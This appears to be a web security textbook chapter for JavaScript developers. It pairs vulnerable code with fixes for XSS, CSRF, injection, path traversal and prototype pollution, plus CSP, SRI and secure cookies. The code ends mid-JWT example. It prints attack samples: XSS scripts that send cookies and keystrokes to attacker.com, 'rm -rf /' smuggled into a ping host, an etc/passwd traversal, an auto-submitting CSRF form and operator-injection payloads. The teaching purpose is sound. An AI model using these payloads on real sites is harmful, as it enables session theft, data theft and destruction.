# 24 Security Best Practices

Security is critical for web applications. This chapter covers common vulnerabilities, secure coding practices, authentication, and data protection.

---

# JavaScript Deep Dive: Security


## 24.1 Common Vulnerabilities

Understanding common vulnerabilities helps prevent security breaches.

### Cross-Site Scripting (XSS)

XSS allows attackers to inject malicious scripts into web pages viewed by other users.

#### Types of XSS

**1. Reflected XSS (Non-Persistent)**

```javascript
// VULNERABLE: Reflects user input directly
// URL: https://example.com/search?q=<script>alert('XSS')</script>

app.get('/search', (req, res) => {
  const query = req.query.q;
  
  // DANGEROUS: Unsanitized user input in HTML
  res.send(`<h1>Search results for: ${query}</h1>`);
  // Executes: <h1>Search results for: <script>alert('XSS')</script></h1>
});

// SAFE: Escape user input
const escapeHtml = (text) => {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
};

app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q);
  res.send(`<h1>Search results for: ${query}</h1>`);
  // Safe: <h1>Search results for: &lt;script&gt;alert('XSS')&lt;/script&gt;</h1>
});
```

**2. Stored XSS (Persistent)**

```javascript
// VULNERABLE: Stores and displays malicious content
const comments = [];

app.post('/comment', (req, res) => {
  const comment = req.body.comment;
  
  // DANGEROUS: Stores unsanitized input
  comments.push(comment);
  res.json({ success: true });
});

app.get('/comments', (req, res) => {
  // DANGEROUS: Displays stored XSS
  const html = comments.map(c => `<div>${c}</div>`).join('');
  res.send(html);
});

// Attacker posts: <img src=x onerror="alert('XSS')">
// All users viewing comments execute the script

// SAFE: Sanitize on input and escape on output
const DOMPurify = require('isomorphic-dompurify');

app.post('/comment', (req, res) => {
  // Sanitize HTML, remove scripts
  const clean = DOMPurify.sanitize(req.body.comment, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: []
  });
  
  comments.push(clean);
  res.json({ success: true });
});

app.get('/comments', (req, res) => {
  // Still escape for defense in depth
  const html = comments.map(c => escapeHtml(c)).join('');
  res.send(html);
});
```

**3. DOM-Based XSS**

```javascript
// VULNERABLE: Client-side XSS
// URL: https://example.com/#<img src=x onerror="alert('XSS')">

// DANGEROUS: Direct DOM manipulation with user input
const hash = window.location.hash.substring(1);
document.getElementById('output').innerHTML = hash;

// SAFE: Use textContent instead of innerHTML
const hash = window.location.hash.substring(1);
document.getElementById('output').textContent = hash;

// Or sanitize if HTML is needed
const hash = window.location.hash.substring(1);
const clean = DOMPurify.sanitize(hash);
document.getElementById('output').innerHTML = clean;
```

#### XSS Prevention

```javascript
// 1. Escape output context-appropriately
function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

function escapeAttribute(text) {
  return text.replace(/["']/g, '&#x22;');
}

function escapeJavaScript(text) {
  return text.replace(/[\\'"]/g, '\\$&').replace(/\n/g, '\\n');
}

// 2. Use safe APIs
// BAD
element.innerHTML = userInput;

// GOOD
element.textContent = userInput;

// BAD
element.setAttribute('href', userInput);

// GOOD - validate URL
const url = new URL(userInput, window.location.origin);
if (url.protocol === 'http:' || url.protocol === 'https:') {
  element.setAttribute('href', url.href);
}

// 3. Use template engines with auto-escaping
// React (auto-escapes by default)
function Comment({ text }) {
  return <div>{text}</div>; // Automatically escaped
}

// To render HTML (use with caution!)
function Comment({ htmlContent }) {
  const clean = DOMPurify.sanitize(htmlContent);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// 4. Content Security Policy
// Set CSP header to prevent inline scripts
// Content-Security-Policy: script-src 'self'
```

#### Real-World XSS Examples

```javascript
// Example 1: Cookie stealing
// Attacker injects:
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

// Protection: HttpOnly cookies
res.cookie('session', sessionId, {
  httpOnly: true,  // Not accessible via JavaScript
  secure: true,
  sameSite: 'strict'
});

// Example 2: Keylogger
// Attacker injects:
<script>
  document.addEventListener('keypress', (e) => {
    fetch('https://attacker.com/log?key=' + e.key);
  });
</script>

// Protection: CSP prevents inline scripts

// Example 3: Page defacement
// Attacker injects:
<script>
  document.body.innerHTML = '<h1>Hacked!</h1>';
</script>

// Protection: Input sanitization and CSP
```

### Cross-Site Request Forgery (CSRF)

CSRF tricks users into performing unwanted actions on a site where they're authenticated.

#### How CSRF Works

```html
<!-- Attacker's malicious site -->
<html>
<body>
  <!-- Victim is logged into bank.com -->
  <!-- This form auto-submits -->
  <form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>

<!-- If bank.com doesn't have CSRF protection, 
     the transfer happens using the victim's session -->
```

#### CSRF Prevention

**1. CSRF Tokens**

```javascript
// Server-side (Express)
const crypto = require('crypto');
const sessions = new Map();

// Generate CSRF token
function generateCsrfToken(sessionId) {
  const token = crypto.randomBytes(32).toString('hex');
  sessions.set(sessionId, token);
  return token;
}

// Middleware to check CSRF token
function csrfProtection(req, res, next) {
  const sessionId = req.cookies.sessionId;
  const token = req.body.csrfToken || req.headers['x-csrf-token'];
  
  const expectedToken = sessions.get(sessionId);
  
  if (!token || token !== expectedToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  
  next();
}

// Routes
app.get('/form', (req, res) => {
  const sessionId = req.cookies.sessionId;
  const csrfToken = generateCsrfToken(sessionId);
  
  res.send(`
    <form action="/transfer" method="POST">
      <input type="hidden" name="csrfToken" value="${csrfToken}">
      <input name="to" placeholder="Recipient">
      <input name="amount" placeholder="Amount">
      <button type="submit">Transfer</button>
    </form>
  `);
});

app.post('/transfer', csrfProtection, (req, res) => {
  // Process transfer - protected from CSRF
  const { to, amount } = req.body;
  res.json({ success: true });
});

// Client-side (AJAX)
const csrfToken = document.querySelector('[name=csrfToken]').value;

fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken
  },
  body: JSON.stringify({ to: 'recipient', amount: 100 })
});
```

**2. SameSite Cookie Attribute**

```javascript
// Modern CSRF protection with SameSite cookies
app.use(session({
  secret: 'secret-key',
  cookie: {
    sameSite: 'strict',  // or 'lax'
    secure: true,        // HTTPS only
    httpOnly: true
  }
}));

// SameSite='strict': Cookie not sent on any cross-site request
// SameSite='lax': Cookie sent on safe cross-site requests (GET, not POST)
// SameSite='none': Cookie sent on all cross-site requests (requires Secure)
```

**3. Double Submit Cookie**

```javascript
// Store CSRF token in both cookie and request body
app.get('/api/token', (req, res) => {
  const token = crypto.randomBytes(32).toString('hex');
  
  res.cookie('csrf-token', token, {
    sameSite: 'strict',
    secure: true
  });
  
  res.json({ token });
});

app.post('/api/action', (req, res) => {
  const cookieToken = req.cookies['csrf-token'];
  const bodyToken = req.body.csrfToken;
  
  if (!cookieToken || cookieToken !== bodyToken) {
    return res.status(403).json({ error: 'CSRF token mismatch' });
  }
  
  // Process action
});
```

**4. Checking Origin/Referer Headers**

```javascript
function checkOrigin(req, res, next) {
  const origin = req.headers.origin || req.headers.referer;
  const allowedOrigins = ['https://example.com', 'https://www.example.com'];
  
  if (!origin || !allowedOrigins.some(allowed => origin.startsWith(allowed))) {
    return res.status(403).json({ error: 'Invalid origin' });
  }
  
  next();
}

app.post('/api/sensitive', checkOrigin, (req, res) => {
  // Protected endpoint
});
```

### Injection Attacks

Injection attacks insert malicious code into application queries or commands.

#### SQL Injection

```javascript
// VULNERABLE: Concatenating user input
app.get('/user', (req, res) => {
  const userId = req.query.id;
  
  // DANGEROUS: SQL injection possible
  const query = `SELECT * FROM users WHERE id = ${userId}`;
  // Attacker: /user?id=1 OR 1=1
  // Query: SELECT * FROM users WHERE id = 1 OR 1=1
  // Returns all users!
  
  db.query(query, (err, results) => {
    res.json(results);
  });
});

// SAFE: Use parameterized queries
app.get('/user', (req, res) => {
  const userId = req.query.id;
  
  // Safe: Parameters are escaped
  const query = 'SELECT * FROM users WHERE id = ?';
  
  db.query(query, [userId], (err, results) => {
    res.json(results);
  });
});

// Or with named parameters
const query = 'SELECT * FROM users WHERE id = :id';
db.query(query, { id: userId }, (err, results) => {
  res.json(results);
});
```

#### NoSQL Injection

```javascript
// VULNERABLE: MongoDB injection
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  // DANGEROUS: Object injection
  // Attacker sends: { username: "admin", password: { $ne: null } }
  // Matches any password!
  db.users.findOne({ username, password }, (err, user) => {
    if (user) {
      res.json({ success: true });
    }
  });
});

// SAFE: Validate input types
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  // Ensure inputs are strings
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }
  
  db.users.findOne({ username, password }, (err, user) => {
    if (user) {
      res.json({ success: true });
    }
  });
});

// Or sanitize MongoDB operators
function sanitizeQuery(query) {
  if (typeof query !== 'object' || query === null) {
    return query;
  }
  
  const sanitized = {};
  for (const [key, value] of Object.entries(query)) {
    // Remove MongoDB operators
    if (key.startsWith('$')) {
      continue;
    }
    sanitized[key] = typeof value === 'object' 
      ? sanitizeQuery(value) 
      : value;
  }
  return sanitized;
}
```

#### Command Injection

```javascript
// VULNERABLE: Executing shell commands with user input
const { exec } = require('child_process');

app.get('/ping', (req, res) => {
  const host = req.query.host;
  
  // DANGEROUS: Command injection
  exec(`ping -c 4 ${host}`, (err, stdout) => {
    res.send(stdout);
  });
  // Attacker: /ping?host=google.com;rm -rf /
  // Executes: ping -c 4 google.com;rm -rf /
});

// SAFE: Use spawn with arguments array
const { spawn } = require('child_process');

app.get('/ping', (req, res) => {
  const host = req.query.host;
  
  // Validate input
  if (!/^[a-zA-Z0-9.-]+$/.test(host)) {
    return res.status(400).json({ error: 'Invalid host' });
  }
  
  // Safe: Arguments are separate
  const ping = spawn('ping', ['-c', '4', host]);
  
  let output = '';
  ping.stdout.on('data', (data) => {
    output += data;
  });
  
  ping.on('close', (code) => {
    res.send(output);
  });
});
```

#### Path Traversal

```javascript
// VULNERABLE: Reading arbitrary files
const fs = require('fs');
const path = require('path');

app.get('/file', (req, res) => {
  const filename = req.query.name;
  
  // DANGEROUS: Path traversal
  const filepath = path.join(__dirname, 'files', filename);
  // Attacker: /file?name=../../etc/passwd
  
  fs.readFile(filepath, 'utf8', (err, data) => {
    res.send(data);
  });
});

// SAFE: Validate and normalize path
app.get('/file', (req, res) => {
  const filename = req.query.name;
  
  // Remove any path components
  const safeName = path.basename(filename);
  
  // Resolve full path
  const filepath = path.resolve(__dirname, 'files', safeName);
  const filesDir = path.resolve(__dirname, 'files');
  
  // Ensure file is within allowed directory
  if (!filepath.startsWith(filesDir)) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  fs.readFile(filepath, 'utf8', (err, data) => {
    if (err) {
      return res.status(404).json({ error: 'File not found' });
    }
    res.send(data);
  });
});
```

### Prototype Pollution

Prototype pollution allows attackers to modify Object.prototype, affecting all objects.

#### How Prototype Pollution Works

```javascript
// VULNERABLE: Deep merge function
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object') {
      target[key] = target[key] || {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Attacker's payload
const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');

const user = {};
merge(user, malicious);

// Now ALL objects have isAdmin = true!
const anotherUser = {};
console.log(anotherUser.isAdmin); // true (polluted!)

// Real-world impact
if (someUser.isAdmin) {
  // Grant admin access - security breach!
}
```

#### Prototype Pollution Prevention

```javascript
// SAFE: Check for prototype properties
function safeMerge(target, source) {
  for (const key in source) {
    // Prevent prototype pollution
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;
    }
    
    if (typeof source[key] === 'object' && source[key] !== null) {
      target[key] = target[key] || {};
      safeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// SAFER: Use Object.create(null) for pure data objects
const safeObject = Object.create(null);
// No prototype chain, can't be polluted
safeObject.__proto__ = { isAdmin: true };
console.log(safeObject.isAdmin); // undefined

// SAFEST: Use Map for user-controlled keys
const userData = new Map();
userData.set('__proto__', { isAdmin: true }); // Just a regular entry
console.log(userData.get('isAdmin')); // undefined

// Freeze Object.prototype (nuclear option)
Object.freeze(Object.prototype);
Object.prototype.isAdmin = true; // Silently fails
console.log({}.isAdmin); // undefined

// Use schema validation
const Joi = require('joi');

const schema = Joi.object({
  name: Joi.string().required(),
  age: Joi.number().integer().min(0),
  // Explicitly define allowed properties
}).unknown(false); // Reject unknown properties

const { error, value } = schema.validate(userInput);
if (error) {
  throw new Error('Invalid input');
}
```

#### Real-World Prototype Pollution

```javascript
// CVE example: lodash merge vulnerability (pre-4.17.11)
const _ = require('lodash');

const user = {};
_.merge(user, JSON.parse('{"__proto__": {"isAdmin": true}}'));

console.log({}.isAdmin); // true - prototype polluted!

// Fixed version checks for __proto__
// Always use latest versions and check CVEs

// Defense in depth
function createSafeObject(data) {
  // 1. Validate schema
  if (!isValidSchema(data)) {
    throw new Error('Invalid schema');
  }
  
  // 2. Create object without prototype
  const obj = Object.create(null);
  
  // 3. Copy only allowed properties
  const allowedKeys = ['name', 'email', 'age'];
  for (const key of allowedKeys) {
    if (key in data) {
      obj[key] = data[key];
    }
  }
  
  return obj;
}
```

### Insecure Dependencies

Third-party packages may contain vulnerabilities.

#### Dependency Scanning

```bash
# npm audit - check for known vulnerabilities
npm audit

# View detailed report
npm audit --json

# Automatically fix vulnerabilities
npm audit fix

# Force fix (may include breaking changes)
npm audit fix --force

# yarn alternative
yarn audit

# snyk - more comprehensive
npm install -g snyk
snyk test
snyk monitor
```

#### Package.json Best Practices

```json
{
  "name": "my-app",
  "dependencies": {
    "express": "^4.18.0"
  },
  "devDependencies": {
    "jest": "^29.0.0"
  },
  "scripts": {
    "audit": "npm audit",
    "audit-fix": "npm audit fix",
    "preinstall": "npm audit"
  },
  "engines": {
    "node": ">=18.0.0",
    "npm": ">=9.0.0"
  }
}
```

#### Checking Dependencies

```javascript
// Check for known malicious packages
// Use tools like Socket.dev, Snyk, or npm audit

// Verify package integrity
const crypto = require('crypto');
const fs = require('fs');

function verifyPackageIntegrity(packagePath, expectedHash) {
  const fileBuffer = fs.readFileSync(packagePath);
  const hashSum = crypto.createHash('sha256');
  hashSum.update(fileBuffer);
  
  const hex = hashSum.digest('hex');
  
  if (hex !== expectedHash) {
    throw new Error('Package integrity check failed!');
  }
  
  return true;
}

// Use package-lock.json or yarn.lock to ensure reproducible builds
// These files lock exact versions and integrity hashes

// Review dependencies before installing
// Check: downloads, GitHub stars, last update, maintainers
```

#### Supply Chain Attacks

```javascript
// Typosquatting: Similar package names
// Real: "express" vs Malicious: "expres", "express-js"

// Prevention:
// 1. Double-check package names
// 2. Use exact version pinning
{
  "dependencies": {
    "express": "4.18.2"  // Exact version, no ^
  }
}

// 3. Use .npmrc to restrict registry
// .npmrc
registry=https://registry.npmjs.org/

// 4. Enable 2FA for npm account
npm profile enable-2fa auth-and-writes

// 5. Use private registry for internal packages

// 6. Review dependency updates carefully
// Don't blindly accept automated PRs from bots
```

---

## 24.2 Secure Coding Practices

Implementing secure coding practices prevents vulnerabilities.

### Input Validation and Sanitization

Always validate and sanitize user input.

#### Validation Libraries

```javascript
// Joi validation
const Joi = require('joi');

const userSchema = Joi.object({
  username: Joi.string()
    .alphanum()
    .min(3)
    .max(30)
    .required(),
  
  email: Joi.string()
    .email()
    .required(),
  
  password: Joi.string()
    .min(8)
    .pattern(new RegExp('^(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9])(?=.*[!@#$%^&*])'))
    .required(),
  
  age: Joi.number()
    .integer()
    .min(0)
    .max(150),
  
  website: Joi.string()
    .uri()
});

app.post('/register', (req, res) => {
  const { error, value } = userSchema.validate(req.body);
  
  if (error) {
    return res.status(400).json({ 
      error: error.details[0].message 
    });
  }
  
  // value is validated and sanitized
  createUser(value);
  res.json({ success: true });
});

// express-validator
const { body, validationResult } = require('express-validator');

app.post('/user',
  // Validation rules
  body('email').isEmail().normalizeEmail(),
  body('age').isInt({ min: 0, max: 150 }),
  body('username').trim().escape().isLength({ min: 3, max: 30 }),
  
  (req, res) => {
    const errors = validationResult(req);
    
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    
    // Validated input
    res.json({ success: true });
  }
);
```

#### Custom Validation

```javascript
// Type checking
function validateInput(input, schema) {
  for (const [field, rules] of Object.entries(schema)) {
    const value = input[field];
    
    // Required check
    if (rules.required && !value) {
      throw new Error(`${field} is required`);
    }
    
    // Type check
    if (value && rules.type && typeof value !== rules.type) {
      throw new Error(`${field} must be ${rules.type}`);
    }
    
    // Min/max for numbers
    if (rules.type === 'number') {
      if (rules.min !== undefined && value < rules.min) {
        throw new Error(`${field} must be >= ${rules.min}`);
      }
      if (rules.max !== undefined && value > rules.max) {
        throw new Error(`${field} must be <= ${rules.max}`);
      }
    }
    
    // Min/max length for strings
    if (rules.type === 'string') {
      if (rules.minLength && value.length < rules.minLength) {
        throw new Error(`${field} must be at least ${rules.minLength} characters`);
      }
      if (rules.maxLength && value.length > rules.maxLength) {
        throw new Error(`${field} must be at most ${rules.maxLength} characters`);
      }
    }
    
    // Pattern matching
    if (rules.pattern && !rules.pattern.test(value)) {
      throw new Error(`${field} format is invalid`);
    }
    
    // Custom validator
    if (rules.validator && !rules.validator(value)) {
      throw new Error(`${field} validation failed`);
    }
  }
  
  return true;
}

// Usage
const schema = {
  email: {
    required: true,
    type: 'string',
    pattern: /^[^\s@]+@[^\s@]+\.[^\s@]+$/
  },
  age: {
    required: true,
    type: 'number',
    min: 0,
    max: 150
  },
  username: {
    required: true,
    type: 'string',
    minLength: 3,
    maxLength: 30,
    pattern: /^[a-zA-Z0-9_]+$/
  }
};

try {
  validateInput(req.body, schema);
  // Process valid input
} catch (error) {
  res.status(400).json({ error: error.message });
}
```

#### Sanitization

```javascript
// HTML sanitization
const DOMPurify = require('isomorphic-dompurify');

function sanitizeHtml(dirty) {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href'],
    ALLOW_DATA_ATTR: false
  });
}

// URL sanitization
function sanitizeUrl(url) {
  try {
    const parsed = new URL(url);
    
    // Only allow http/https
    if (!['http:', 'https:'].includes(parsed.protocol)) {
      throw new Error('Invalid protocol');
    }
    
    return parsed.href;
  } catch (error) {
    throw new Error('Invalid URL');
  }
}

// File upload validation
const path = require('path');

function validateUpload(file) {
  const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif'];
  const allowedMimeTypes = ['image/jpeg', 'image/png', 'image/gif'];
  const maxSize = 5 * 1024 * 1024; // 5MB
  
  const ext = path.extname(file.originalname).toLowerCase();
  
  if (!allowedExtensions.includes(ext)) {
    throw new Error('Invalid file type');
  }
  
  if (!allowedMimeTypes.includes(file.mimetype)) {
    throw new Error('Invalid MIME type');
  }
  
  if (file.size > maxSize) {
    throw new Error('File too large');
  }
  
  return true;
}
```

### Output Encoding

Properly encode output based on context.

#### Context-Specific Encoding

```javascript
// HTML context
function encodeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;'
  };
  
  return text.replace(/[&<>"'/]/g, char => map[char]);
}

// HTML attribute context
function encodeHtmlAttribute(text) {
  return text.replace(/["']/g, char => {
    return `&#x${char.charCodeAt(0).toString(16)};`;
  });
}

// JavaScript context
function encodeJavaScript(text) {
  return text
    .replace(/\\/g, '\\\\')
    .replace(/'/g, "\\'")
    .replace(/"/g, '\\"')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/\t/g, '\\t')
    .replace(/</g, '\\x3C')
    .replace(/>/g, '\\x3E');
}

// URL context
function encodeUrl(text) {
  return encodeURIComponent(text);
}

// CSS context
function encodeCss(text) {
  return text.replace(/[^a-zA-Z0-9]/g, char => {
    return `\\${char.charCodeAt(0).toString(16)} `;
  });
}

// Usage examples
const userInput = '<script>alert("XSS")</script>';

// In HTML
const html = `<div>${encodeHtml(userInput)}</div>`;
// <div>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</div>

// In attribute
const attr = `<div title="${encodeHtmlAttribute(userInput)}">`;

// In JavaScript
const js = `<script>const msg = '${encodeJavaScript(userInput)}';</script>`;

// In URL
const url = `<a href="/search?q=${encodeUrl(userInput)}">Search</a>`;
```

#### Template Engines with Auto-Escaping

```javascript
// EJS with auto-escaping
const ejs = require('ejs');

const template = '<div><%= userInput %></div>';
const html = ejs.render(template, { 
  userInput: '<script>alert("XSS")</script>' 
});
// Output: <div>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</div>

// Handlebars with auto-escaping
const Handlebars = require('handlebars');

const template = Handlebars.compile('<div>{{userInput}}</div>');
const html = template({ 
  userInput: '<script>alert("XSS")</script>' 
});
// Output: <div>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</div>

// Raw HTML (use with caution)
const template = Handlebars.compile('<div>{{{userInput}}}</div>');
// Triple braces disable escaping - sanitize first!
const html = template({ 
  userInput: DOMPurify.sanitize(userInput) 
});
```

### Content Security Policy (CSP)

CSP prevents XSS by controlling which resources can be loaded.

#### Basic CSP

```javascript
// Express middleware
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self'; " +
    "style-src 'self'; " +
    "img-src 'self' data: https:; " +
    "font-src 'self'; " +
    "connect-src 'self'; " +
    "frame-ancestors 'none';"
  );
  next();
});

// Helmet.js (recommended)
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    styleSrc: ["'self'", "'unsafe-inline'"],  // Try to avoid unsafe-inline
    imgSrc: ["'self'", 'data:', 'https:'],
    connectSrc: ["'self'"],
    fontSrc: ["'self'"],
    objectSrc: ["'none'"],
    mediaSrc: ["'self'"],
    frameSrc: ["'none'"],
    frameAncestors: ["'none'"]
  }
}));
```

#### Advanced CSP

```javascript
// Nonce-based CSP (best for inline scripts)
const crypto = require('crypto');

app.use((req, res, next) => {
  // Generate unique nonce for this request
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  
  res.setHeader(
    'Content-Security-Policy',
    `script-src 'self' 'nonce-${res.locals.nonce}'; ` +
    `style-src 'self' 'nonce-${res.locals.nonce}';`
  );
  
  next();
});

// In template
// <script nonce="<%= nonce %>">
//   console.log('Allowed by CSP');
// </script>

// Hash-based CSP (for static inline scripts)
const scriptContent = "console.log('Hello');";
const hash = crypto.createHash('sha256')
  .update(scriptContent)
  .digest('base64');

res.setHeader(
  'Content-Security-Policy',
  `script-src 'self' 'sha256-${hash}';`
);

// Strict CSP
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'none'"],
    scriptSrc: ["'self'", "'strict-dynamic'"],
    styleSrc: ["'self'"],
    imgSrc: ["'self'"],
    connectSrc: ["'self'"],
    fontSrc: ["'self'"],
    objectSrc: ["'none'"],
    mediaSrc: ["'self'"],
    frameSrc: ["'none'"],
    frameAncestors: ["'none'"],
    baseUri: ["'none'"],
    formAction: ["'self'"],
    upgradeInsecureRequests: []
  }
}));
```

#### CSP Reporting

```javascript
// Report violations
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    reportUri: '/csp-violation-report'
  },
  reportOnly: false  // Set to true to test without blocking
}));

// CSP violation endpoint
app.post('/csp-violation-report', express.json(), (req, res) => {
  const violation = req.body['csp-report'];
  
  console.error('CSP Violation:', {
    blockedUri: violation['blocked-uri'],
    violatedDirective: violation['violated-directive'],
    originalPolicy: violation['original-policy'],
    documentUri: violation['document-uri']
  });
  
  // Log to monitoring service
  // sendToMonitoring(violation);
  
  res.status(204).end();
});
```

### Subresource Integrity (SRI)

SRI ensures that files fetched from CDNs haven't been tampered with.

#### Generating SRI Hashes

```bash
# Generate SRI hash
cat script.js | openssl dgst -sha384 -binary | openssl base64 -A

# Or use online tool
# https://www.srihash.org/
```

#### Using SRI

```html
<!-- Script with SRI -->
<script 
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous">
</script>

<!-- Stylesheet with SRI -->
<link 
  rel="stylesheet"
  href="https://cdn.example.com/style.css"
  integrity="sha384-+/M6kredJcxdsqkczBs+smHyVsocYf/wd9Cv9m1XBp1bBvjC/GBHnTCwsz7sXrNc"
  crossorigin="anonymous">

<!-- Multiple hashes (fallback) -->
<script 
  src="https://cdn.example.com/library.js"
  integrity="sha384-hash1 sha512-hash2"
  crossorigin="anonymous">
</script>
```

#### Generating SRI in Build Process

```javascript
// webpack-subresource-integrity plugin
const SriPlugin = require('webpack-subresource-integrity');

module.exports = {
  output: {
    crossOriginLoading: 'anonymous'
  },
  plugins: [
    new SriPlugin({
      hashFuncNames: ['sha256', 'sha384'],
      enabled: process.env.NODE_ENV === 'production'
    })
  ]
};

// Manual SRI generation
const crypto = require('crypto');
const fs = require('fs');

function generateSRI(filepath, algorithm = 'sha384') {
  const content = fs.readFileSync(filepath);
  const hash = crypto.createHash(algorithm)
    .update(content)
    .digest('base64');
  
  return `${algorithm}-${hash}`;
}

const integrity = generateSRI('./dist/app.js');
console.log(integrity);
// sha384-oqVuAfXRKap7fdgcCY5uykM6+...
```

### HTTPS Enforcement

Always use HTTPS to protect data in transit.

#### Redirecting HTTP to HTTPS

```javascript
// Express middleware
function enforceHTTPS(req, res, next) {
  if (!req.secure && req.get('x-forwarded-proto') !== 'https') {
    return res.redirect(301, 'https://' + req.get('host') + req.url);
  }
  next();
}

app.use(enforceHTTPS);

// Or use helmet
app.use(helmet.hsts({
  maxAge: 31536000,  // 1 year
  includeSubDomains: true,
  preload: true
}));
```

#### HSTS Header

```javascript
// Strict-Transport-Security header
app.use((req, res, next) => {
  res.setHeader(
    'Strict-Transport-Security',
    'max-age=31536000; includeSubDomains; preload'
  );
  next();
});

// Or use helmet
app.use(helmet());
```

### Secure Cookie Practices

Properly configure cookies to prevent attacks.

#### Secure Cookie Attributes

```javascript
// Setting secure cookies
res.cookie('sessionId', sessionId, {
  httpOnly: true,      // Not accessible via JavaScript
  secure: true,        // Only sent over HTTPS
  sameSite: 'strict',  // CSRF protection
  maxAge: 3600000,     // 1 hour
  path: '/',
  domain: '.example.com'
});

// Session cookie configuration
const session = require('express-session');

app.use(session({
  secret: process.env.SESSION_SECRET,
  name: 'sessionId',  // Don't use default name
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,
    httpOnly: true,
    sameSite: 'strict',
    maxAge: 3600000
  },
  store: new RedisStore({
    client: redisClient,
    prefix: 'sess:'
  })
}));

// Cookie signing
const cookieParser = require('cookie-parser');

app.use(cookieParser(process.env.COOKIE_SECRET));

// Set signed cookie
res.cookie('data', 'value', { signed: true });

// Read signed cookie
const signedCookie = req.signedCookies.data;
```

#### Cookie Prefixes

```javascript
// __Secure- prefix (requires secure flag)
res.cookie('__Secure-sessionId', sessionId, {
  secure: true,
  httpOnly: true,
  sameSite: 'strict'
});

// __Host- prefix (requires secure, no domain, path=/)
res.cookie('__Host-sessionId', sessionId, {
  secure: true,
  httpOnly: true,
  sameSite: 'strict',
  path: '/'
  // No domain attribute
});
```

---

## Summary

This document covered JavaScript Security comprehensively:

**Common Vulnerabilities:**

- **XSS**: Reflected, stored, and DOM-based XSS with prevention techniques
- **CSRF**: Attack vectors and protection methods (tokens, SameSite, double-submit)
- **Injection**: SQL, NoSQL, command, and path traversal attacks with safe coding practices
- **Prototype Pollution**: How it works and prevention strategies
- **Insecure Dependencies**: Scanning, validation, and supply chain security

**Secure Coding Practices:**

- **Input Validation**: Using validation libraries, custom validation, and sanitization
- **Output Encoding**: Context-specific encoding for HTML, JavaScript, URLs, and CSS
- **Content Security Policy**: Basic and advanced CSP configurations with nonces and reporting
- **Subresource Integrity**: Generating and using SRI hashes for CDN resources
- **HTTPS Enforcement**: Redirecting to HTTPS and HSTS headers
- **Secure Cookies**: HttpOnly, Secure, SameSite attributes, signing, and prefixes

Security requires defense in depth: multiple layers of protection working together.

---

**Related Topics:**

- Authentication and Authorization
- OAuth and JWT Security
- API Security
- Penetration Testing
- Security Headers
# Authentication & Data Protection


## 24.3 Authentication & Authorization

Authentication verifies identity; authorization determines access rights.

### Token-based Authentication (JWT)

JSON Web Tokens provide stateless authentication.

#### JWT Structure

```javascript
// JWT consists of three parts: header.payload.signature
// Example: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

// Header
{
  "alg": "HS256",  // Algorithm
  "typ": "JWT"     // Token type
}

// Payload (Claims)
{
  "sub": "1234567890",           // Subject (user ID)
  "name": "John Doe",            // Custom claim
  "iat": 1516239022,             // Issued at
  "exp": 1516242622,             // Expiration
  "iss": "https://example.com",  // Issuer
  "aud": "https://api.example.com" // Audience
}

// Signature
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret
)
```

#### Creating and Verifying JWTs

```javascript
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

// Generate strong secret
const JWT_SECRET = process.env.JWT_SECRET || crypto.randomBytes(64).toString('hex');
